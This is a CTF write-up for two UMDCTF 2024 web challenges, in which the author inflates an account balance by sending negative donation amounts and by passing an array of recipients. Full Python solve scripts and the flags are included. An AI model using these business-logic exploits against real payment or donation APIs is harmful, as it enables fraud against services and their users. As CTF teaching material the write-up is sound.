---
date: 2024-04-30
description: Abusing API business logic to get rich
platform: UMDCTF 2024
categories: Web
tags:
  - API
  - insecure-design
duration:
---

# # UMDCTF 2024 Writeups

Writeups for solved [UMDCTF 2024](https://ctftime.org/event/2323) web challenges (2/4)

---

# web
## web/Donations
> Show off your capitalistic altruism today. https://donations.challs.umdctf.io

Challenge about abusing the  business logic and increasing our initial account balance

We can view the JS source code and find API endpoints. https://donations-api.challs.umdctf.io/api/flag endpoint returns  `only the wealthy may view the treasure`. 


We start with a currency of `1000`. To get the flag, we need to increase our currency to `5000` in our account.  The main feature of the website is that we can send/donate  to another user but the requirement is that we can only send to `lisanalgaib`.
<br><br>
To solve it, I sent negative values in the donate API endpoint and it accepted it.

```python
donate_url = "https://donations-api.challs.umdctf.io/api/donate?username=lisanalgaib"

donation = {
	"to": "lisanalgaib",
	"currency": -4000 # 1000 -(-4000) = 5000
}
r = s.post(donate_url, data=donation)
```

solve.py
```python
import requests, os

flag_url = "https://donations-api.challs.umdctf.io/api/flag"
register_url = "https://donations-api.challs.umdctf.io/api/register"
login_url = "https://donations-api.challs.umdctf.io/api/login"
donate_url = "https://donations-api.challs.umdctf.io/api/donate?username=lisanalgaib"

username = os.environ.get('username')
password = os.environ.get('password')
main_creds = {"username": username, "password": password}

def login(s, data):
    r = s.post(login_url, data=data)
    print(r.text)
    return s 

def register(data):
    s = requests.session()
    r = s.post(register_url, data=data)
    print(r.text)
    return s 

def donate(s):
    # allows negative values to increase our own money
	donation = {
		"to": "lisanalgaib",
		"currency": -4000 
	}
	r = s.post(donate_url, data=donation)
	print(r.text)

def main():
    s = requests.Session()
    s = register(main_creds)
    s = login(s, main_creds)

    donate(s)

    r = s.get(flag_url)
    print(r.text)
    
if __name__ == "__main__":
    main()

```

flag: **UMDCTF{BE20$_1s_7h3_T0N6U3_OF_Th3_uN5e3N}**

---

## web/Donations (but I fixed it)
> Bezos is not happy with what you did to his net worth. https://donations2.challs.umdctf.io

The challenge is similar to the previous challenge that we need to increase our initial balance. However, the donate API is "fixed" and does not allow negative integer inputs.  There is still no way to change the recipient of our donation. It still requires `lisanalgaib`

To solve I learned i can send donations in multiple users by specifying an array of users instead of a single user example: `to=["lisanalgaib","another_user"]`. This way the required user is still included in the request and that we can also donate to another user.

```python
donation = {
	"to": ["lisanalgaib", "another_user"],
	"currency": 1000
}
r = s.post("https://donations2-api.challs.umdctf.io/api/donate?username=lisanalgaib", data=donation)
```

This means that i can create multiple accounts and send money to my main account. 

solve.py
```python
import requests, os

flag_url = "https://donations2-api.challs.umdctf.io/api/flag"
register_url = "https://donations2-api.challs.umdctf.io/api/register"
login_url = "https://donations2-api.challs.umdctf.io/api/login"
donate_url = "https://donations2-api.challs.umdctf.io/api/donate?username=lisanalgaib"

username = os.environ.get('username')
password = os.environ.get('password')
main_creds = {"username": username, "password": password}

def login(s, data):
    r = s.post(login_url, data=data)
    print(r.text)
    return s 

def register(data):
    s = requests.session()
    r = s.post(register_url, data=data)
    print(r.text)
    return s 

def donate(s):
	# donate to multiple users only deducting 1000 
	donation = {
		"to": ["lisanalgaib", username],
		"currency": 1000
	}
	r = s.post(donate_url, data=donation)
	print(r.text)

def main():
    # create random users and send donation to main account
    for i in range(5):
        new_user = "user_abc" + str(i)        
        creds = {"username": new_user, "password": "password"}
        s = register(creds)
        s = login(s, creds)
	    donate(s)
	# get flag on main account 
    s = requests.Session()
    s = login(s, main_creds)
    r = s.get(flag_url)
    print(r.text)
    
if __name__ == "__main__":
    main()
```

flag: **UMDCTF{TeS7_your_CHAL1En93S 6UyS}.**
